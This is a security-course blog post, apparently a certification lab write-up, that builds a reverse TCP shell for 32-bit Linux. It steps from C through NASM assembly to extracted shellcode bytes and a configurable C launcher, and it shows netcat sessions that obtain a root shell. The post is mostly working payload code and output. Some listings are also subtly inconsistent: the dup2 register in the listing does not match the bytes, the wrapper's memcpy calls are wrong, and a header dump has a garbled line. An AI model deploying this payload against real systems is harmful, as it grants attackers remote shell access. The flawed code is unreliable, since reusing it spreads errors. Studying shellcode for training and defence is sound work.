---
layout: single
title: 'SLAE32 - Assignment #2 - Reverse TCP Shell'
date: 2020-08-22
classes: wide
header:
  teaser: /assets/images/SLAE32/SLAE32.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - Reverse TCP Shellcode 
--- 
![](/assets/images/SLAE32/SLAE32.jpg)


## SLAE32 Assignment #2 - Reverse TCP Shell

<h2><span style="color:#339966;"><strong>Student ID : SLAE &nbsp;– 1314</strong></span></h2>
<h2><span style="color:#339966;"><strong>Assignment 2</strong>:</span></h2>
<p style="text-align:justify;">The goal of this assignment is to create a reverse <strong>TCP <em><strong>s</strong>hellcode</em></strong> that does the following</p>

<ul>
 	<li><strong>Reverse connection to configured IP and Port</strong></li>
 	<li><strong>Executes shell on successful connection</strong></li>
 	<li><strong>IP should be easily configurable</strong></li>
</ul>
<blockquote>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification</blockquote>
<span style="color:#000000;"><!-- wp:html --></span>
<blockquote>The code and scripts for this assignment can be found on my <a href="https://github.com/xvass/SLAE/tree/master/Assignment2">github</a></blockquote>
<blockquote>All the development and tests have been implemented in the following architecture</blockquote>
<blockquote><strong>Linux kali 5.4.0-kali2-686-pae #1 SMP Debian 5.4.8-1kali1 (2020-01-06) i686 GNU/Linux&nbsp;</strong></blockquote>
<p style="text-align:justify;">
For this assignment the following <strong>C</strong> program will be used as a base program in order to create our shellcode
</p>

```c

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "192.168.200.4"
#define REMOTE_PORT 1234

int main(int argc, char *argv[])
{
struct sockaddr_in sa;
int sockfd;

sockfd = socket(AF_INET, SOCK_STREAM, 0);

sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
sa.sin_port = htons(REMOTE_PORT);
connect(sockfd, (struct sockaddr *)&amp;sa, sizeof(sa));
dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);

execve("/bin/sh", 0, 0);
return 0;
}

```

<p style="text-align:justify;">
In order to convert the above code into x86 assembly, there is a need to investigate the&nbsp; system calls being used. Specifically, the following&nbsp; system calls are used:
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
socket
connect 
dup2 
execve
</pre>

<p style="text-align:justify;">The above system calls except <strong>execve</strong>&nbsp;and <strong>dup2</strong> are socket system calls&nbsp;and they are referenced with <strong>socketcall</strong> which is a common kernel entry point. Furthermore, the following steps are mentioned in order to construct and create the reverse shell connection as follows</p>

<ol>
 	<li>Use <strong>connect</strong> system call to connect to a <strong>socket</strong> in specified address</li>
 	<li>Add the destination address to the <strong>sockaddr</strong> structure</li>
 	<li>Duplicate the <strong>stdin</strong>, <strong>stdout</strong> and <strong>stderr</strong> to the open <strong>socket</strong></li>
</ol>
<p style="text-align:justify;">The steps above providing a footprint to further build the <strong>reverse tcp shellcode</strong>. Moreover, searching the <strong>net.h</strong> header file we can see the defined identifier for the <strong>connect</strong> system call</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># cat /usr/include/linux/net.h | grep SYS_CONNECT
#define SYS_CONNECT 3 /* sys_connect(2) */
</pre>

Proceeding further, it is time to create the <strong>reverse.nasm</strong> file. Before starting to write the reverse tcp shellcode in assembly, the registers <strong>eax</strong>&nbsp; and <strong>edx</strong>&nbsp; will be zeroed out as follows

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
global _start 
section .text 

_start:  

xor eax, eax  ;zero out eax register  
mul edx       ;zero out edx register
</pre>

<p style="text-align:justify;">In order to be able to call socket system calls such as <strong>socket</strong> and <strong>connect , </strong>first&nbsp;we must use another system call named <strong>socketcall</strong> which used to determine which socket system call is about to be used. The <strong>socketcall</strong> prototype is as follows</p>

<h3>Socketcall Function Synopsis</h3>

```c
#include <linux/net.h>
int socketcall(int call, unsigned long *args);
```

<p style="text-align:justify;">The <strong>call</strong> argument determines which <strong>socket</strong> function to invoke.&nbsp;<strong>args </strong>points to a block containing the actual arguments, which are passed through to the appropriate call. In this case, the <strong>socketcall</strong> system call identifier will be determined first and afterwards the <strong>socket</strong> system calls (socket and connect ) will be called through the <strong>call</strong> instruction in assembly.</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>:~/Documents/SLAE/Assignment2</b></span># cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
#define __NR_socketcall 102
</pre>

<p style="text-align:justify;">As seen above,&nbsp; the <strong>socketcall</strong> can be called using the defined identifier <strong>102</strong> which is <strong>0x66</strong> in hex. Before moving further in x86 assembly, a very important aspect of the language compilation must be mentioned, which is the calling convention.</p>
<p style="text-align:justify;">In x86 Linux systems the system calls parameters are passed into the stack using the following registers</p>

<ul>
 	<li style="text-align:justify;"><strong>eax</strong> used to hold the system call number. Also used to hold the return value from the stack</li>
 	<li style="text-align:justify;"><strong>ecx, edx, ebx, esi, edi, ebp</strong> are used to pass 6 parameter arguments to system call functions</li>
 	<li style="text-align:justify;">All other registers including <strong>EFLAGS</strong> are preserved across the <strong>int 0x80 </strong>instruction.</li>
</ul>
The next step is to create the new socket. Following is the <strong>socket</strong> system call prototype
<h3>Socket Function Synopsis</h3>

```c
#include <sys/types.h>
#include <sys/socket.h>

int socket(int domain, int type, int protocol);
```

<p style="text-align:justify;">According to the <strong>socket</strong> <a href="https://man7.org/linux/man-pages/man2/socket.2.html">man</a> page, the <b>socket</b> system call creates an endpoint for communication and returns a file descriptor that refers to that endpoint.</p>
<p style="text-align:justify;">The <strong>domain</strong> argument specifies a communication domain; this selects the protocol family which will be used for communication. At the current architecture, these families are defined in file <strong>/usr/include/i386-linux-gnu/bits/socket.h</strong> as shown below</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># cat /usr/include/i386-linux-gnu/bits/socket.h | grep AF_
#define AF_UNSPEC PF_UNSPEC
#define AF_LOCAL PF_LOCAL
#define AF_UNIX PF_UNIX
#define AF_FILE PF_FILE
#define AF_INET PF_INET
#define AF_AX25 PF_AX25
#define AF_IPX PF_IPX
#define AF_APPLETALK PF_APPLETALK
#define AF_NETROM PF_NETROM
#define AF_BRIDGE PF_BRIDGE
#define AF_ATMPVC PF_ATMPVC
#define AF_X25 PF_X25
#define AF_INET6 PF_INET6
#define AF_ROSE PF_ROSE
#define AF_DECnet PF_DECnet
#define AF_NETBEUI PF_NETBEUI
#define AF_SECURITY PF_SECURITY
#define AF_KEY PF_KEY
#define AF_NETLINK PF_NETLINK
#define AF_ROUTE PF_ROUTE
#define AF_PACKET PF_PACKET
#define AF_ASH PF_ASH
#define AF_ECONET PF_ECONET
#define AF_ATMSVC PF_ATMSVC
#define AF_RDS PF_RDS
#define AF_SNA PF_SNA
#define AF_IRDA PF_IRDA
#define AF_PPPOX PF_PPPOX
#define AF_WANPIPE PF_WANPIPE
#define AF_LLC PF_LLC
#define AF_IB PF_IB
#define AF_MPLS PF_MPLS
#define AF_CAN PF_CAN
#define AF_TIPC PF_TIPC
#define AF_BLUETOOTH PF_BLUETOOTH
#define AF_IUCV PF_IUCV
#define AF_RXRPC PF_RXRPC
#define AF_ISDN PF_ISDN
#define AF_PHONET PF_PHONET
#define AF_IEEE802154 PF_IEEE802154
#define AF_CAIF PF_CAIF
#define AF_ALG PF_ALG
#define AF_NFC PF_NFC
#define AF_VSOCK PF_VSOCK
#define AF_KCM PF_KCM
#define AF_QIPCRTR PF_QIPCRTR
#define AF_SMC PF_SMC
#define AF_XDP PF_XDP
#define AF_MAX PF_MAX
exception of AF_UNIX). */
</pre>

<p style="text-align:justify;">Moreover, there are several types of sockets, although stream sockets and datagram sockets are the most commonly used. The types of sockets are also defined inside the file <strong>/usr/include/i386-linux-gnu/bits/socket.h</strong>. The following output shows the assigned values at the stream and datagram sockets accordingly</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># cat /usr/include/i386-linux-gnu/bits/socket.h | grep SOCK_
SOCK_STREAM = 1, /* Sequenced, reliable, connection-based
#define SOCK_STREAM SOCK_STREAM
SOCK_DGRAM = 2, /* Connectionless, unreliable datagrams
#define SOCK_DGRAM SOCK_DGRAM
SOCK_RAW = 3, /* Raw protocol interface. */
#define SOCK_RAW SOCK_RAW
SOCK_RDM = 4, /* Reliably-delivered messages. */
#define SOCK_RDM SOCK_RDM
SOCK_SEQPACKET = 5, /* Sequenced, reliable, connection-based,
#define SOCK_SEQPACKET SOCK_SEQPACKET
7 = 6, /* Datagram Congestion Control Protocol. */
#define SOCK_DCCP SOCK_DCCP
SOCK_PACKET = 10, /* Linux specific way of getting packets
#define SOCK_PACKET SOCK_PACKET
SOCK_CLOEXEC = 02000000, /* Atomically set close-on-exec flag for the
#define SOCK_CLOEXEC SOCK_CLOEXEC
SOCK_NONBLOCK = 04000 /* Atomically mark descriptor(s) as
#define SOCK_NONBLOCK SOCK_NONBLOCK
</pre>

<p style="text-align:justify;">Moreover, the following snippet describes the implementation of the <strong>socket</strong> system call as well as the use of the <strong>socketcall </strong>system call.</p>

<h3>Socket:</h3>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;;sockfd = socket(AF_INET,SOCK_STREAM,0);
push edx       ; push 0 on the stack which is related with the third argument of the socket system call
mov ebx, edx   ; zero out ebx  
inc ebx        ; define the SYS_SOCKET value to be 0x1. 
push ebx       ; SOCK_STREAM constant at type argument
push 0x2       ; AF_INET constant at domain argument 
mov ecx, esp   ; ECX will point to args at the top of the stack 
mov al, 0x66   ; call SocketCall() >
int 0x80       ; call system call interrupt to execute the</span> <span style="color:#33cccc;">arguments</span> 
mov edi, eax   ; EAX will store the return value of the socket descriptor to edi register 
</pre>

<p style="text-align:justify;">Also, regarding the second argument of the <strong>socketcall</strong> system call, the low order register <strong>bl </strong>of<strong> ebx </strong>register&nbsp;will be assigned with the value <strong>0x1</strong>&nbsp;which indicates the <strong>SYS_SOCKET</strong><strong>&nbsp;</strong>constant as we see below in red</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># cat /usr/include/linux/net.h | grep SYS
#define SYS_SOCKET 1 /* sys_socket(2) */
#define SYS_BIND 2 /* sys_bind(2) */
#define SYS_CONNECT 3 /* sys_connect(2) */
#define SYS_LISTEN 4 /* sys_listen(2) */
#define SYS_ACCEPT 5 /* sys_accept(2) */
#define SYS_GETSOCKNAME 6 /* sys_getsockname(2) */
#define SYS_GETPEERNAME 7 /* sys_getpeername(2) */
#define SYS_SOCKETPAIR 8 /* sys_socketpair(2) */
#define SYS_SEND 9 /* sys_send(2) */
#define SYS_RECV 10 /* sys_recv(2) */
#define SYS_SENDTO 11 /* sys_sendto(2) */
#define SYS_RECVFROM 12 /* sys_recvfrom(2) */
#define SYS_SHUTDOWN 13 /* sys_shutdown(2) */
#define SYS_SETSOCKOPT 14 /* sys_setsockopt(2) */
#define SYS_GETSOCKOPT 15 /* sys_getsockopt(2) */
#define SYS_SENDMSG 16 /* sys_sendmsg(2) */
#define SYS_RECVMSG 17 /* sys_recvmsg(2) */
#define SYS_ACCEPT4 18 /* sys_accept4(2) */
#define SYS_RECVMMSG 19 /* sys_recvmmsg(2) */
#define SYS_SENDMMSG 20 /* sys_sendmmsg(2) */
</pre>

<p style="text-align:justify;">The following snippet describes the <strong>connect</strong> system call implementation that comes next in the process of creating the <strong>reverse shellcode</strong>. Below is the <strong>connect</strong> system call prototype according to the <a href="https://man7.org/linux/man-pages/man2/connect.2.html">man</a> page</p>

<h3>Connect Function Synopsis</h3>

```c
#include <sys/types.h>
#include <sys/socket.h>

int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
```

<p style="text-align:justify;">The <strong>connect</strong>&nbsp;system call connects the socket referred to by the file descriptor <strong>sockfd</strong> to the address specified by <strong>addr</strong>. The <strong>addrlen</strong> argument specifies the size of <strong>addr</strong>. The format of the address in <strong>addr</strong> is determined by the address space of the socket <strong>sockfd</strong>; for more details see <a href="https://man7.org/linux/man-pages/man2/socket.2.html">socket</a>. If the socket <strong>sockfd</strong> is of type <strong>SOCK_DGRAM</strong>, then <strong>addr</strong> is the address to which datagrams are sent by default, and the only address from which datagrams are received. If the socket is of type <strong>SOCK_STREAM</strong> or <strong>SOCK_SEQPACKET</strong>, this call attempts to make a connection to the socket that is bound to the address specified by <strong>addr</strong>.</p>

<h3>Connect :</h3>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;; sa.sin_family = AF_INET;
;; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
;; sa.sin_port = htons(REMOTE_PORT);
;; connect(sockfd, (struct sockaddr *)sa, sizeof(sa));

pop ebx          ; assign ebx with value (2)
push 0x04c8a8c0  ; push IP 192.168.200.4 on the stack
push word 0xd204 ; push port 1234 on the stack 
push bx          ; push AF_INET constant into the 16 bytes register avoiding nulls 
mov ecx, esp     ; perform stack alignment - ecx points to struct 
push 0x10        ; the size of the port  
push ecx         ; pointer to host_addr struct
push edi         ; save socket descriptor sockfd to struct
mov ecx, esp     ; perform stack alignment - ecx points at struct 
inc ebx          ; use the connect system call (3) 
mov al, 0x66     ; call the socketcall system call
int 0x80         ; call interrupt
</pre>

<p style="text-align:justify;">As seen at the code above in red, the tcp PORT and the IP are in hex format. They both pushed on the stack after transformed in network byte order. That happened because ports and addresses are always specified in calls to the socket functions using the network byte order convention. This convention is a method of sorting bytes independently of specific machine architectures. The following python script does the network byte convention and then transforms the decimal value into hex in order to use it when the port pushed on the stack</p>

```python
#!/usr/bin/python

import socket, struct, sys

ip=sys.argv[1]
tip = socket.inet_aton(ip)
print "IP in hex Network Byte Order : ", '0x' + hex(struct.unpack("!L", tip[::-1])[0])[2:].zfill(8)
port = sys.argv[2]
nport = socket.htons(int(port))
print "Port in hex Network Byte order : " , hex(nport)
```

the following output of the script above shows the output of the IP 192.168.200.4 and PORT 1234 in network byte order.

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># python naddr.py 192.168.200.4 1234
IP in hex Network Byte Order : 0x04c8a8c0
Port in hex Network Byte order : 0xd204
</pre>

<h3>dup2 Function Synopsis</h3>

```c
#include <unistd.h>

int dup2(int oldfd, int newfd);
```

<p style="text-align:justify;">After the connect system call, there must be a redirection from standard input, output and error descriptors to the <strong>socket</strong> descriptor created from the <strong>socket</strong> system call. This has to be done in order to be able to initiate commands in a shell environment at the target machine. The following description has been taken from Linux manual page: The <strong>dup2</strong> system call performs the same task as <strong>dup</strong>, but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor specified in <strong>newfd</strong>. If the file descriptor <strong>newfd</strong> was previously open, it is silently closed before being reused.</p>

<h3>Dup2 :</h3>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;;dup2(sockfd, 2); 
;;dup2(sockfd, 1); 
;;dup2(sockfd, 0);
   
mov ebx, esi  ; move sockfd descriptor to ebx 
xor ecx, ecx  ; zero out the ecx register before using it 
lo:
  mov al, 0x3f ; the functional number that indicates dup2 (63 in dec)
  int 0x80     ; call dup2 syscall
  inc ecx      ; increase the value of ecx by 1 so it will take all values 0(stdin), 1(stdout), 2(stderr)
  cmp cl, 0x2  ; compare ecx with 2 which indicates the stderr descriptor
  jle lo       ; loop until counter is less or equal to 2
</pre>

<h3>execve Function Synopsis</h3>
<p style="text-align:justify;">Now that the standard input, output and error are pointing to 0,1,2 file descriptors, the run the <strong>execve</strong> function will be run in order to execute the <strong>/bin/sh</strong> command to the target host.</p>

```c
#include <unistd.h>

int execve(const char *filename, char *const&nbsp;argv[],
char *const&nbsp;envp[]);
```

<h3>Execve:</h3>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;; execve("/bin/sh", 0, 0);
xor eax, eax      ; zero out the eax register
push eax          ; push NULL into the stack  
push 0x68732f2f   ; push "hs//" in reverse order into stack
push 0x6e69622f   ; push "nib/" in reverse order into stack
mov ebx, esp      ; point ebx into stack
push eax          ; push NULL into the stack
mov edx, esp      ; point to edx into stack 
push ebx          ; push ebx into stack
mov ecx, esp      ; point to ecx into stack
mov al, 0xb       ; 0xb indicates the execve syscall
int 0x80          ; execute execve syscall
</pre>

<p style="text-align:justify;">As just shown, the <strong>/bin/sh</strong> string is pushed onto the stack in reverse order by first pushing the terminating null value of the string, and then pushing the <strong>//sh (4 bytes are required for alignment and the second / has no effect)</strong>, and finally pushing the<strong> /bin</strong> onto the stack. At this point, we have all that we need on the stack, so <strong>esp</strong> now points to the location of <strong>/bin/sh</strong>.</p>
Now that the code is ready, it is time to test it. The following commands will be used in order to compile and link the code.

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># nasm -f elf32 -o reverse.o reverse.nasm

<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># ld -z execstack -o reverse reverse.o
</pre>

<p style="text-align:justify;">Furthermore, the reverse program runs as follows</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># ./reverse 
</pre>

<p style="text-align:justify;">In detail, when the reverse program runs, a connection initiates&nbsp;to the target machine that listens to port <strong>1234&nbsp;</strong></p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
~ nc -nlv 1234
whoami
root
netstat -antp | grep 1234
tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
</pre>

<p style="text-align:justify;">Furthermore, after the successful connection to the target machine, we will use the following python command in order to have a bash prompt to the open shell above</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
~ nc -nlv 1234
python -c 'import pty; pty.spawn("/bin/bash")'
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># id
id
uid=0(root) gid=0(root) groups=0(root)
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># netstat -antp | grep 1234
netstat -antp | grep 1234
tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
</pre>


Moreover, in order to create the configurable shellcode, the first thing to do is to use the following command to create the shellcode

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># objdump -d ./reverse|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\xf7\xe2\x52\x89\xd3\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc7\x5b\x68\xc0\xa8\xc8\x04\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xfb\x31\xc9\xb0\x3f\xcd\x80\x41\x66\x83\xf9\x02\x7e\xf5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
</pre>

<p style="text-align:justify;">Afterwards, the following code utilises the shellcode created from the assembly code. The program initialises a custom <strong>PORT</strong> and <strong>IP</strong> to connect to the target host.</p>

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define PORT 27
#define IP 21

int main(int argc, char *argv[])
{

unsigned char shellcode[] = \
"\x31\xc0\xf7\xe2\x52\x89"
"\xd3\x43\x53\x6a\x02\x89"
"\xe1\xb0\x66\xcd\x80\x89"
"\xc7\x5b\x68"
"\xc0\xa8\xc8\x04" //IP
"\x66\x68"
"\x04\xd2"// PORT
"\x66\x53\x89\xe1\x6a\x10"
"\x51\x57\x89\xe1\x43\xb0"
"\x66\xcd\x80\x89\xfb\x31"
"\xc9\xb0\x3f\xcd\x80\x41"
"\x66\x83\xf9\x02\x7e\xf5"
"\x31\xc0\x50\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x89\xe2"
"\x53\x89\xe1\xb0\x0b\xcd"
"\x80";

if (argc &lt; 2) {
printf("[!] Usage: %s &lt;IP&gt; &lt;PORT&gt;\n\n", argv[0]);
return -1;
}

// provide binary form of the IP into the shellcode in order to be able to connect to that specific IP address
unsigned ipaddress = inet_addr(argv[1]);

// copy the IP in the right shellcode offset 21 bytes from the beginning of the shellcode
memcpy(shellcode[IP], ipaddress, 4);

// provide binary form of the port into the shellcode in order to be able to connect to that specific port

unsigned int port = htons(atoi(argv[2]));

// copy the new port in the right shellcode offset 27 bytes from the beginning of the shellcode
memcpy(shellcode[PORT], port, 2);

printf("Shellcode Length: %d\n", strlen(shellcode));

int (*ret)() = (int(*)())shellcode;

ret();

}
```

the following command will be used to compile the program above

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
r<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># gcc -fno-stack-protector  -z execstack -m32 -o revshell revshell.c
</pre>

Furthermore, as seen below when the <strong>revshell</strong> program runs, then if a target machine listens to specific port&nbsp; ( e.g <strong>1234</strong> using a listener ) , then a new connection starts on the target machine.

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># ./revshell 192.168.200.4 1234
Shellcode Length: 84
</pre>

As we see below the communication has been established with the target machine on port <strong>1234</strong> and we can run commands remotely


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
~ nc -nlv 1234 
whoami
root
netstat -antp | grep 1234
tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
</pre>

Furthermore, after the successful connection to the target machine, we will use the following python command in order to have a bash prompt to the open shell above


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
~ nc -nlv 1234 
python -c 'import pty; pty.spawn("/bin/bash")' 
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># id
id
uid=0(root) gid=0(root) groups=0(root) 
root@slae:~/Documents/SLAE/Assignment2# netstat -antp | grep 1234
netstat -antp | grep 1234
tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
</pre>

